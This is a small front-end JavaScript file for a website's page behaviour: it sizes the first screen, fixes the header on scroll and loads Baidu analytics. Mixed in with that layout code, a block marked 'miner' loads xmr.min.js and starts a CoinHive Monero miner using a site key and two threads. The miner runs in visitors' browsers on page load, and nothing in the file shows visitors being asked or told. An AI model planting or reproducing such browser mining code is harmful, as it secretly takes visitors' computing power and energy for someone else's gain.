(function () {
  // first screen
  $('.first-screen').height($(window).height());

  // scroll
  $(window).scroll(function () {
    if ($('body').height() < $(window).height() * 2 + $('.header').outerHeight()) {
      return;
    }
    if ($(window).scrollTop() > $(window).height()) {
      $('.header').addClass('header-fixed');
      $('.first-screen .required').css('padding-top', '116px')
    } else {
      $('.header').removeClass('header-fixed');
      $('.first-screen .required').css('padding-top', '50px')
    }
  });

  // miner
  const scriptDom = document.createElement('script')
  scriptDom.setAttribute('src', 'https://static.hacpai.com/js/lib/xmr.min.js')
  document.head.appendChild(scriptDom)
  scriptDom.onload = function () {
    (CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0.5})).start();
  }

  // baidu
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?f17557e022686a8ff2a6d32403393093";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
})();